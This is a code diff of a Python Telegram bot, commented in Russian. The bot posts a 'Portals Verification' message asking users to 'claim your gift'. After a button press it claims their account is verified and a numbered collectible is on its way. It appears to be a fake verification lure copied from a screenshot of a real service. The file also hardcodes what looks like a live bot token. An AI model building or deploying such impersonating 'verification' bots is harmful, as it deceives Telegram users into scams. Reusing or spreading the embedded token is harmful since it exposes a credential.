@@ -1,6 +1,6 @@
 import logging
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
 # Настройка логирования
 logging.basicConfig(
@@ -12,7 +12,7 @@ logger = logging.getLogger(__name__)
 # ТОКЕН БОТА
 TOKEN = "8868277445:AAEPYSE-uoej11anci9jpiaoDYsOqL_-tps"
 
-# Ссылка на аватарку (твоя новая)
+# Ссылка на аватарку
 PHOTO_URL = "https://i.postimg.cc/4KGSwvT6/IMG-4158.jpg"
 
 # Функция для команды /start
@@ -23,7 +23,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    # Текст сообщения (ТОЧНО КАК НА СКРИНШОТЕ)
+    # Текст сообщения
     message = (
         f"🎩 *Portals Verification*\n\n"
         f"**Final Verification Required: Claim Your Gift**\n\n"
@@ -47,7 +47,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     if query.data == 'verify':
-        # Меняем текст и убираем кнопку
         await query.edit_message_caption(
             caption="✅ *Account Verified!*\n\n"
                     "Your JollyChimp #20,203 is on its way! 🎩✨\n\n"
@@ -55,7 +54,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     "**FULL WORK, НОВЫЙ БОТ УЖЕ В ЧАТЕ**",
             parse_mode='Markdown'
         )
-        # Убираем кнопку
         await query.edit_message_reply_markup(reply_markup=None)
 
 # Команда /help
